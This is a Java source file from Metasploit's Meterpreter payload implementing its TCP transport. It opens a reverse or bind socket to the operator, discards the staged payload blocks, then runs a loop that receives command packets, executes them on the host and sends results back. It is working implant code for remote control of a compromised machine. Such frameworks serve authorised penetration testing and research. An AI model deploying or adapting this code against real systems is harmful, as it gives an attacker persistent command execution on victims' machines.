package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.EOFException;
import java.io.IOException;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

import com.metasploit.meterpreter.command.Command;

public class TcpTransport extends Transport {
    private Socket sock = null;
    private DataInputStream inputStream = null;
    private DataOutputStream outputStream = null;
    private String host;
    private int port;

    // This whole thing exists just so that we can deal with
    // the fact that MSF thinks we've 'died' (and therefore
    // it hangs) when we terminate the socket. We need to wait
    // for MSF to terminate instead.
    private class SocketDisposer extends Thread {
        private final Socket sock;
        private final DataInputStream in;
        private final DataOutputStream out;

        public SocketDisposer(Socket s, DataInputStream in, DataOutputStream out) {
            this.sock = s;
            this.in = in;
            this.out = out;
        }

        public void run() {
            if (this.in != null) {
                try {
                    byte[] buffer = new byte[16];
                    while (true) {
                        this.in.readFully(buffer);
                    }
                }
                catch (IOException ex) {
                    try {
                        this.in.close();
                    }
                    catch (IOException ex2) {
                    }
                }
            }

            if (this.out != null) {
                try {
                    // keep writing until the socket dies, from there
                    // we'll know that the other end has actually closed it.
                    while (true) {
                        this.out.writeByte((byte)0);
                    }
                }
                catch (IOException ex) {
                    try {
                        this.out.flush();
                        this.out.close();
                    }
                    catch (IOException ex2) {
                    }
                }
            }

            if (this.sock != null) {
                try {
                    this.sock.close();
                }
                catch (IOException ex) {
                }
            }
        }
    }

    public TcpTransport(String url) {
        super(url);

        int portStart = url.lastIndexOf(":");
        this.port = Integer.parseInt(url.substring(portStart + 1));
        this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
        System.out.println("msf : Host: " + this.host);
        System.out.println("msf : Port: " + this.port);
    }

    public void bind(DataInputStream in, OutputStream rawOut) {
        this.inputStream = in;
        this.outputStream = new DataOutputStream(rawOut);
    }

    public int parseConfig(byte[] configuration, int offset) {
        return this.parseTimeouts(configuration, offset);
    }

    public boolean switchUri(String uri) {
        // tcp transports don't support URL switching
        return false;
    }

    public void disconnect() {
        SocketDisposer s = new SocketDisposer(this.sock, this.inputStream, this.outputStream);
        this.sock = null;
        this.inputStream = null;
        this.outputStream = null;

        s.start();
    }

    protected boolean tryConnect(Meterpreter met) throws IOException {
        if (this.inputStream != null) {
            // we're already connected
            System.out.println("msf : Connecting on existing transport");
            return true;
        }

        if (this.host.equals("")) {
            ServerSocket server = new ServerSocket(this.port);
            this.sock = server.accept();
            server.close();
        } else {
            this.sock = new Socket(this.host, this.port);
        }

        if (this.sock != null) {
            this.sock.setSoTimeout(500);
            this.inputStream = new DataInputStream(this.sock.getInputStream());
            this.outputStream = new DataOutputStream(this.sock.getOutputStream());

            // this point we are effectively stageless, so flush the socket
            this.flushInputStream(met.getIgnoreBlocks());

            return true;
        }

        return false;
    }

    public TLVPacket readPacket() throws IOException {
        int len = this.inputStream.readInt();
        int type = this.inputStream.readInt();
        return new TLVPacket(this.inputStream, len - 8);
    }

    public void writePacket(TLVPacket packet, int type) throws IOException {
        byte[] data = packet.toByteArray();
        synchronized (this.outputStream) {
            System.out.println("msf : sending response");
            this.outputStream.writeInt(data.length + 8);
            this.outputStream.writeInt(type);
            this.outputStream.write(data);
            this.outputStream.flush();
            System.out.println("msf : sent response");
        }
    }

    public boolean dispatch(Meterpreter met) {
        System.out.println("msf : In the dispatch loop");
        long lastPacket = System.currentTimeMillis();
        int result = 0;
        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                System.out.println("msf : Waiting for packet");
                TLVPacket request = this.readPacket();

                if (request == null) {
                    continue;
                }

                System.out.println("msf : Packet received");

                // got a packet, update the timestamp
                lastPacket = System.currentTimeMillis();

                TLVPacket response = request.createResponse();
                result = met.getCommandManager().executeCommand(met, request, response);
                System.out.println("msf : command executed: " + result);

                this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
                System.out.println("msf : response sent");

                if (result == Command.EXIT_DISPATCH) {
                    return true;
                }
            } catch (SocketTimeoutException ex) {
                // socket comms timeout, didn't get a packet,
                // this is ok, so we ignore it
                System.out.println("msf : Socket timeout (OK)");
            } catch (SocketException ex) {
                // sometimes we'll have issues where writing a response when we're exiting
                // the dispatch is intended, so we'll check for that here too
                if (result == Command.EXIT_DISPATCH) {
                    System.out.println("msf : Exception in exit of dispatch, indicating intention");
                    return true;
                }
            }
            catch (Exception ex) {
                // any other type of exception isn't good.
                System.out.println("msf : Some other exception: " + ex.getClass().getName());
                break;
            }
        }

        // if we get here we assume things aren't good, or we have a session timeout/expiration
        return false;
    }

    private void flushInputStream(int blocks) throws IOException {
        // we can assume that the server is trying to send the second
        // stage at this point, so let's just read that in for now.
        System.out.println("msf : Flushing the input stream, blocks is " + blocks);
        for (int i = 0; i < blocks; i++) {
            System.out.println("msf : Flushing the input stream: " + i);
            int blobLen = this.inputStream.readInt();
            System.out.println("msf : Discarding bytes: " + blobLen);
            byte[] throwAway = new byte[blobLen];
            this.inputStream.readFully(throwAway);
        }
        // and finally discard the block count
        this.inputStream.readInt();
    }
}
